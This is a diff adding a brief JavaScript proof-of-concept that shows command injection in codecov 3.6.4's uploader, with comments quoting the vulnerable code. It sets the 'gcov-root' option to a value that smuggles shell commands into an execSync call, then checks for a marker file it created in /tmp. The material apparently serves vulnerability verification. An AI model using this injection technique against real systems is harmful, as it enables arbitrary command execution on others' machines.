@@ -1,0 +1,35 @@
+```javascript
+var codecov = require("./node_modules/codecov").handleInput
+
+// codecov@3.6.4 lib/codecov.js builds a shell command string by directly
+// concatenating the user-supplied `gcov-root` option:
+//
+//   gcov = 'find ' + (args.options['gcov-root'] || root) +
+//          " -type f -name '*.gcno' " + gcg + ' -exec ' +
+//          (validator.escape(args.options['gcov-exec']) || 'gcov') + ' ' +
+//          (validator.escape(args.options['gcov-args']) || '') + ' {} +'
+//   execSync(gcov)
+//
+// `gcov-root` is never quoted/escaped, so shell metacharacters in it are
+// executed verbatim by execSync() -> arbitrary command injection.
+var args = {
+  options: {
+    disable: 'search',       // skip unrelated file-search step
+    dump: true,              // avoid a real network upload to codecov.io
+    'gcov-root': '. ; touch /tmp/codecov_pwned ; echo INJECTED-BY-EXPLOIT',
+    'gcov-exec': 'gcov',      // must be a string or validator.escape() throws first
+    'gcov-args': '',
+  },
+}
+
+codecov.upload(args, function() {}, function() {})
+
+setTimeout(function() {
+  var fs = require('fs')
+  if (fs.existsSync('/tmp/codecov_pwned')) {
+    console.log('VULNERABLE: command injection executed, /tmp/codecov_pwned created')
+  } else {
+    console.log('exploit did not trigger')
+  }
+}, 500)
+```
